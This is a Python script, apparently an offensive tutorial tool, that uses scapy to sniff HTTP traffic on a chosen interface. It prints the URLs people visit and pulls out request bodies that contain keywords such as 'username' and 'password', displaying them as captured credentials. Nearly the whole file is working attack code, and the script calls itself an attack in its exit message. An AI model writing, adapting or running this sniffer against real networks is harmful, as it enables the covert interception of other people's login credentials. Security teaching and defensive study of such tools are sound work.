#!/usr/bin/env python3

import argparse
import signal
import sys

import scapy.all as scapy
from colorama import init, Fore
from halo import Halo
from scapy.layers import http

# To sniff the packets that are traveling through a specific interface in our device
# we can use a scapy function called "sniff" :
# The scapy.sniff function arguments are:
# iface : interface to sniff on
# store : a boolean value that will control the storing of the sniffed data
# prn   : is the function to be executed on each sniffed packet, so sniff is (Higher Order Function)
# filter: this is responsible for filtering the packets that are sniffed,
# to see all values for filters you can visit: https://biot.com/capstats/bpf.html
# But the problem is that the filter parameter in the sniff function doesn't allow us to filter
# the http packets, so we will use another module called scapy_http for that

# Creating a global spinner object for showing the progress of our script:
spinner = Halo(text=" Sniffing Is Running \u2620\ufe0f", spinner='dots')
# Initialize colorama
init()


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.usage = f"This is a tool that sniffs the traffic travelling through a given interface\n" \
                   f"You can customize the fields you want to capture by editing : {__file__}" \
                   f"\nDeveloped By (BigTrader) \u2620\ufe0f"
    parser.add_argument("-i", "--interface", dest="interface",
                        help="The interface that you want to sniff on", required=True)
    arguments = parser.parse_args()

    return arguments


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    visited_host = packet[http.HTTPRequest].Host
    visited_path = packet[http.HTTPRequest].Path
    complete_visited_url = visited_host + visited_path
    return complete_visited_url


def get_login_data(packet):
    # getting the load field of the raw layer
    # ALL that can be applied on all packets not only the HTTP ones !
    # We now need to check if the printed value is what we want
    # so, we will check if the desired keyword is found in the
    # variable to be printed or not
    load = packet[http.Raw].load
    # Again you can customize this to what you want
    expected_names_for_needed_fields = ["login", "username", "user", "uname", "password", "pass"]
    for keyword in expected_names_for_needed_fields:
        if keyword in str(load):
            return load.decode()


def process_sniffed_packet(packet):
    # filtering the sniffed packet for HTTP
    if packet.haslayer(http.HTTPRequest):
        # packet.show()
        # filtering the sniffed packet for the Raw layer of the HTTP
        # that contains the data sent by the browser
        if packet.haslayer(http.Raw):
            # Now lets get any url, so we need to print only the field in the packet that contains the urls
            url = get_url(packet)
            spinner.stop()
            print(Fore.BLUE + "[+]", "HTTP Request >> ", Fore.BLUE + url.decode())
            spinner.start()
            # Getting login data
            login_data = get_login_data(packet)
            if login_data:
                spinner.stop()
                print(Fore.YELLOW +
                      "\r\n\n******************************************************************************************")
                print(Fore.RED + "[+]", " Possible <Usernames/Passwords> >> ",
                      Fore.RED + login_data, u"\u2620\ufe0f \u2620\ufe0f \u2620\ufe0f")
                print(Fore.YELLOW +
                      "\r******************************************************************************************\n\n")
                spinner.start()


def signal_handler(signal, frame):
    # Code to execute when Ctrl+C is pressed
    spinner.stop()
    sys.exit("\n[x] Attack Stopped")


def main():
    try:
        # Register the signal handler for SIGINT (Ctrl+C)
        signal.signal(signal.SIGINT, signal_handler)
        arguments = get_arguments()
        interface = arguments.interface
        spinner.start()
        sniff(interface)
    except Exception as e:
        spinner.stop()
        sys.exit(f"\n[-] An unexpected error occurred: {str(e)}")


if __name__ == '__main__':
    main()
